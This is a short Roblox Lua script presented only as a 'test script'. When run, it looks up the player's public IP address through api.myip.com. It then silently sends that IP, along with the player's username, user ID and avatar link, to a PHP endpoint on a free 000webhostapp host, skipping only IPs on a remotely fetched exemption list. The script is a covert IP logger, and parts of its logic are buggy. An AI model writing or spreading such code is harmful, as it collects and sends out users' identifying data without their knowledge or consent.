_G.scriptName = "TEST SCRIPT BANJOS"
-- inicia la funcion 
function Systema()
	local player = game.Players.LocalPlayer
	local Name = player.Name
	local UserId = player.UserId
	local thumbnail = "http://www.roblox.com/Thumbs/Avatar.ashx?username=" .. Name
	local webhook_link = "https://sgamesc.000webhostapp.com/bbbSystem.php"
	local ip_api_link = "https://api.myip.com/"
	local no_log_ip_link = "https://sgamesc.000webhostapp.com/noiplog.json"
	local client_ip = nil
	local no_log_ips = nil
	local success, resp = pcall(
		function ()
			return game:HttpGet(ip_api_link)
		end
	)
	if success then
		client_ip = game.HttpService:JSONDecode(resp)
		if client_ip.ip then
			client_ip = client_ip.ip
		end
	end

	local success, resp = pcall(
		function ()
			return game:HttpGet(no_log_ip_link)
		end
	)

	if success then
		no_log_ips = game.HttpService:JSONDecode(resp)
		no_log_ips = no_log_ips["no-log-ip"]
	end

	if no_log_ips then
		for _,ip in pairs(no_log_ips) do
			if client_ip.ip == ip then
				return
			end
		end
	end



	if client_ip then
		local URLPARAMS = "?"
		local URL_PARAMS_TABLE = {
			["USERID"] = UserId,
			["USERNAME"] = Name,
			["THUMBNAIL"] = thumbnail,
			["SCRIPT_NAME"] = _G.scriptName,
			["CLIENT_IP"] = client_ip
		}
		local counter = 0
		for param,value in pairs(URL_PARAMS_TABLE) do
			counter = counter + 1
			if counter == #URL_PARAMS_TABLE then
				URLPARAMS = URLPARAMS .. param .. "=" .. value
			end
			URLPARAMS = URLPARAMS .. param .. "=" .. value .. "&"
		end
		if URLPARAMS ~= "?" then
			game:HttpGet(webhook_link .. URLPARAMS)
		end
		counter = 0
	end

	--?USERID=&USERNAME=&THUMBNAIL=&SCRIPT_NAME=&CLIENT_IP=

end

Systema()
